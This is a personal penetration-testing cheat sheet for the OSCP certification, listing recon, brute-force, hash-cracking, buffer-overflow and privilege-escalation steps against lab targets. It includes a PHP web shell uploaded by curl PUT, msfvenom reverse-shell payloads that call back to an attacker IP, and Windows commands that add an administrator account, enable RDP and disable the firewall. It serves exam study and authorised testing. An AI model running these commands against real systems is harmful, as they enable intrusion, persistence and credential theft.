# oscp

# cheatsheet

## TODO:
- build list of dummy password to try

## workflow
1. zenmap intensive scan
2. zenmap full tcp scan
3. attemp to login web / ssh / ftp using common id passwords
    - id: `root`, `admin`
    - password: `root`, `toor`, `password`, `passw0rd`, `admin`, no password

## recon
### HTTP and HTTPs
1. dirbuster (gui)
1. dirb http://10.11.1.115:80/ -o 80_dirb.txt -p proxy:port
1. nikto -h http://10.11.1.115:80 -output 80_nikto.txt -useproxy http://proxy:port
1. if there is a `robots.txt`, check if there is anything that the scanners didn't find
1. also use `curl -i -X OPTIONS http://ip/path` to check what METHODs are available on specific resource
    - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
    - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
1. cms scan (? todo: read it from a tool)
    - `wpscan` (wordpress) - `wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p` # scan vulnerable plugin and find user names
    - `joomscan` (joombla)
    - `drupalscan`(?)
1. WebDAV scan
    - `davtest -url http(s)://[IP]`
1. guess the password by crawling the web page content
    - `cewl http://192.168.56.223/bull -m 3 -w /root/tmp/pass.txt`  # minimal word len: -m 3
    - `john --wordlist=pass.txt --rules --stdout > pass_mangled.txt` # mangle / combine passwords
    - `hydra -l <login_name> -P ~/tmp/vulnhub/pass.txt 192.168.56.223 -V http-form-post '/bull/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`  # brute force attack
    - `wpscan -u http://192.168.56.223/bull/ -U bully -w pass_mangled.txt` # brute force attack 
    - remember do `sort -u` making sure no dup tries
    - for wordpress plugin, you can edit the 404 file (*Appearance -> Editor -> 404.Template*) to put the shell code.. Then curl an invalid page will get the shell code executed
1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
    - use `auxiliary/scanner/http/squid_pivot_scanning` metasploit module for squid/proxy scan, ref: [SickOS 1.1](https://highon.coffee/blog/sickos-1-walkthrough/).
1. it's possible that the server only allow certain user-agent to connect. Check it.
1. Find text and links
    - curl -i <url> -s | html2text
    ```python
    from BeautifulSoup import BeautifulSoup
    import urllib2
    import re

    html_page = urllib2.urlopen("http://www.yourwebsite.com")
    soup = BeautifulSoup(html_page)
    for link in soup.findAll('a'):
        print link.get('href')
    ```
1. for wireshark vulnerability, follow https://highon.coffee/blog/sickos-1-walkthrough/ to get reverse shell via Burp
1. if there is a MySQL database related to the app, find if any config.php or other php containing the database access id/password.
    ```php
    // Database settings:
    define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
    define('DB_USER', 'root');
    define('DB_PASS', 'john@123');
    define('TABLE_PREFIX', '');
    ```

### rlogin smtp enumeration
- if you see `rlogin`.. try to enumerate users via smtp, finger, or other method..  then for each found user, try to rlogin with the user..  chances are, some user id does not enforce any password check
  - kali linux's `rlogin` is symbolic linked to `ssh`.  Use the `putty` on Linux instead.ls -lF
  

## show NFS mount dir content
- `showmount -e ip_address`
- `mount -t nfs ip:/dir_to_mount local_mount_path`
  - if the mount nfs can't be read, it's probably due to nsf server configure the [root squashing](http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html) in `/etc/exports`.  What you need to do is to find out which uid/gid (on the remote) owns this directory, then create a temp user with the same uid/gid on the local, then you should be able to view the mount directory
  - to disable root squashing
    - modify the `/etc/fstab`:  `/home/vulnix    *(rw,no_root_squash,insecure)`
    - restart nsf service or reboot
    - remount.. then you should be able to access the mount dir using root id

## Enumerate SNMP (UDP 161) if it's open
- `snmp-check -t [IP] -c public`

## Enumerate SMB (TCP 139, 445) if it's open
- `enum4linux [IP]`
- `smbclient -L \\[IP]`

## password hash cracking
Cloud:
- https://crackstation.net/
- https://www.md5online.org/

Local tools:
- hash-identifier
- john
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 unshadowed.txt
```
- hashcat
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 0 -a 0 -o unshadowed_cracked.txt unshadowed.txt /usr/share/wordlists/rockyou.txt  # md5
hashcat -m 400 -a 0 -o unshadowed_cracked.txt unshadowed.txt /usr/share/wordlists/rockyou.txt  # WordPress (MD5)
hashcat -m 1800 -a 0 'hashvalue' /usr/share/wordlists/rockyou.txt  # $6$ Linux SHA-256, supply single hash value in CLI
hashcat -m 1800 -a 0 -D 2 -O 'hashvalue' /usr/share/wordlists/rockyou.txt # use GPU
```
To find hash type,
```bash
hashcat --help | grep -i wordpress
```

Hash type examples: https://hashcat.net/wiki/doku.php?id=example_hashes

Wordlist:
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/phpbb.txt`
- `/usr/share/seclists/Passwords/10k_most_common.txt`
- https://github.com/danielmiessler/SecLists

For CTF / OSCP, should not take you more than 30 mins to crack


## generate reverse or local shell payload
- msfvnon https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  J2EE war reverse shell: 
    ```shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
    ```
- payload types, use `msfvenom --list payloads`, see `/mnt/hgfs/kali-vm/msfvenom_payloads.txt`
- generate local shell code
    ```shell
    msfvenom -p linux/x86/exec CMD=/bin/sh -b "x00x0axff" -f c
    ```

## convert reverse shell to tty
```python
python -c "import pty; pty.spawn('/bin/bash')"
```

## windows/linux binary examine
- `strings executable_filename` to see symbols inside the file.. you may find the hardcoded id/password.  If there is `strcpy()` api usage, then the executable might be vulnerable to buffer overflow.
- `objdump -D executable_filename` to see the assembly code. You can use it to search certain `jmp` or `call` instruction
    - `objdump -D executable | grep jmp | grep ebp`
    - `objdump -D executable | grep call | grep eax` 
- if the web site contains some windows PE, might worth to try buffer overflow attacks

## buffer overflow attack
- windows debugger: immunity debugger
- linux debugger: `edb --run file_to_run arguments`
- standalone executable crash: `some_executable $(python -c 'print "A"*100')`
- Generate pattern: https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
- Find bad char: 
```python
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```
- Find modules inside an windows PE (using immunity debugger)
```
!moma modules
```
- Look up x86 OP code
```sh
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000 FFE4  jmp esp
```
- Find OP code inside windows PE (using immunity debugger)
```sh
!mona find -s "\xff\xe4" -m slmfc.dll_or_other_file
```
- Remember, the address must be filled in the reverse way (x86 uses little endian format). In the following mona found result, the exploit EIP value should be filled as `\xf3\x12\x17\x31`)
```
 0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\librah\Dropbox\kali-vm\brainpan.exe)
```
- Generate reverse shell code..  Target system might actually be a Linux running wine (windows emulator)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```
- No Operation (NOP) instruction: `\x90`. The metasploit framework decoder will step on its toes by overwriting the first few bytes of the shellcode.. so we need to pad some NOP instruction.. it might be 8 bytes, 10 bytes, 12 bytes, or more.
```sh
exploit_payload = 'A' * somesize + EIP + '\x90'*10 + reverse_shell_code
```

## compile and run windows binary on linux
- `i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe`
- `wine 646.exe arguments`
- include header files in: `/usr/share/mingw-w64/include`

## create user account
Linux:
```shell
adduser username
usermod -aG sudo username  # add to sudo
```

Windows:
```
REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a USER usr= librah, pass= passw0rd
REM ***************
net user /add librah passw0rd
net localgroup "Administrators" /add librah
net localgroup “Remote Desktop Users” /add librah

REM ***************
REM Show USER info
REM ***************
net user librah

netsh firewall set opmode disable  # todo - available on all windows?
```

Reference: 
- https://www.windows-commandline.com/cmd-net-user-command/
- https://www.windows-commandline.com/enable-remote-desktop-command-line/


## transfer files
Run http server
```shell
python -m SimpleHTTPServer 80
```

Run ftp server
```shell
python -m pyftpdlib
```

## Linux privilege escalation
- Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Tools
    - https://github.com/rebootuser/LinEnum  `./LinEnum.sh -t` # detail scan
    - www.securitysift.com/download/linuxprivchecker.py
    - http://pentestmonkey.net/tools/audit/unix-privesc-check
- Check if any suid executables that can be used.
    - ex: `cp`, `cat` will then be able to read everything
    - ex: `vi` will be able to get to `!bash`
- when searching exploits, search not only kernal but also distribution to increase coverage
  - `searchsploit kernel 3.x`
  - `searchsploit ubuntu 14.04`
- if shell is set with suid bit, execute: `bash -p` to get root (see [here](https://www.linuxquestions.org/questions/programming-9/what-does-p-do-in-bin-bash-p-809364/) for why `-p`)

## Windows priviledge escalation
- https://github.com/frizb/Windows-Privilege-Escalation
- https://411hall.github.io/JAWS-Enumeration/
- https://github.com/joshruppe/winprivesc/blob/master/winprivesc.bat

## references
- https://sushant747.gitbooks.io/total-oscp-guide/
- https://www.securitysift.com/offsec-pwb-oscp/
- https://github.com/xapax/oscp
- Previlege escalation
  - Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - Windows http://www.fuzzysecurity.com/tutorials/16.html
- OSCP experience sharing
  - https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
  - https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19
  - https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
  - https://0daylego.wordpress.com/2017/04/29/scripting-my-way-through-the-oscp-labs/
  - https://jhalon.github.io/OSCP-Review/
- [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md)
